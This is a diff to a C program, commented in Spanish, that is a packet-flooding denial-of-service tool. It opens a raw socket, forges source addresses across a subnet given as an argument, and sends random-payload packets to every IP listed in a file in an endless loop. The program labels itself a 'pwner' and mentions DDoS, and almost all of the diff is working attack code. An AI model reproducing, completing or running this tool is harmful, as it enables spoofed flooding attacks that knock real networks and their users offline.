@@ -1,3 +1,4 @@
+
 #include <time.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -9,10 +10,10 @@
 #include <arpa/inet.h>
 #include <netdb.h>
 #include <unistd.h>
-#define MAX_IPS 655350   // Capacidad máxima de nuestro array
+#define MAX_IPS 9999999   // Capacidad máxima de nuestro array
 #define BUFFER_SIZE 64 // Tamaño del buffer para leer cada línea
-
-unsigned int cargar_ips_binarias(const char *nombre_archivo, unsigned int *array_destino) {
+        unsigned int ips[MAX_IPS];
+unsigned int cargar_ips_binarias(const char *nombre_archivo) {
     FILE *archivo = fopen(nombre_archivo, "r");
     if (archivo == NULL) {
         perror("Error al abrir el archivo de IPs");
@@ -26,8 +27,8 @@ unsigned int cargar_ips_binarias(const char *nombre_archivo, unsigned int *array
     while (fgets(linea, sizeof(linea), archivo) != NULL && contador < MAX_IPS) {
 
         // 1. Limpiar caracteres de salto de línea (\n o \r) que mete fgets
-        linea[strcspn(linea, "\r\n")] = '\0';
-
+        linea[strcspn(linea, "\n")] = '\0';
+//OjO en window$ es "\r\n"
         // Saltarse líneas vacías (por ejemplo, líneas en blanco al final del archivo)
         if (strlen(linea) == 0) {
             continue;
@@ -43,8 +44,9 @@ unsigned int cargar_ips_binarias(const char *nombre_archivo, unsigned int *array
         }
 
         // 3. Guardar en el array binario
-        array_destino[contador] = ip_binaria;
+        ips[contador] = ip_binaria;
         contador++;
+if(MAX_IPS==contador){return contador;}
     }
 
     fclose(archivo);
@@ -55,13 +57,6 @@ int icmpsend(u_int saddr, u_int daddr, unsigned short icmpid,
                  unsigned short datalen);
 unsigned short in_cksum(unsigned short *ptr, int nbytes);
 int sockfd;
-struct pseudohdr{
-        unsigned long saddr;
-        unsigned long daddr;
-        char useless;
-        unsigned char protocol;
-        unsigned short length;
-};
 struct paquetes{
         char* packet;
         unsigned short packet_size;
@@ -70,7 +65,7 @@ struct paquetes{
         unsigned short sockaddr_in_size;
 };
 unsigned int ALAN=0;
-paquetes CASALAN[9999999];
+paquetes CASALAN[MAX_IPS];
 #define PHI 0xaaf219b9
 static uint32_t Q[4096], c = 362436;
 void init_rand(uint32_t x) {
@@ -107,30 +102,36 @@ void generate_random_payload(char *buf, int size) {
     }
 }
 int main(int argc, char **argv){
+if (argc < 2) {
+        printf("Uso correcto: %s <base_ip>\n", argv[0]);
+        printf("Ejemplo: %s 200.0.17\n", argv[0]);
+        return 1; // Terminar el programa con código de error
+    }
+char *mi_red = argv[1];
 init_rand(time(NULL));
         int on = 1;
         sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
         setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on));
-        unsigned int ips[MAX_IPS];
         unsigned short srcp;
         unsigned short dstp;
 unsigned int ipc;
-ipc=cargar_ips_binarias("ips.txt",ips);
+ipc=cargar_ips_binarias("ips.txt");
 printf("# CABASE pwner by Alan Sardon\n");
 //Computize Packets
 unsigned long A;
 char ip_buffer[16];
 char payload[56];
-int i;int j;
-for(i=1;i<255;i++){
+int i=0;int j;
 for(j=0;j<ipc;j++){
 srcp=rand_cmwc() % 65534+1;
 dstp=rand_cmwc() % 65534+1;
-snprintf(ip_buffer, sizeof(ip_buffer), "200.0.17.%d", i);
+snprintf(ip_buffer, sizeof(ip_buffer), "%s.%d",mi_red, i);
 generate_random_payload(payload,55);
 icmpsend(inet_addr(ip_buffer),ips[j],srcp,dstp,payload,sizeof(payload));
 ALAN++;
-}}
+i++;
+if(i==256){i=0;}
+}
 //Ya estan los paquetesd calculaDDoS
 printf("A MITIG.AR\n");
 while(true){
@@ -144,9 +145,7 @@ return 0;
 int icmpsend (unsigned int saddr, unsigned int daddr, unsigned short icmpid,unsigned short icmpseq, char *data, unsigned short datalen){
         char *packet;
         struct iphdr *ip;
-        struct tcphdr *tcp;
         struct icmphdr *icmp;
-        struct pseudohdr *pseudo;
         struct sockaddr_in servaddr;
         int retval;
         int on = 1;
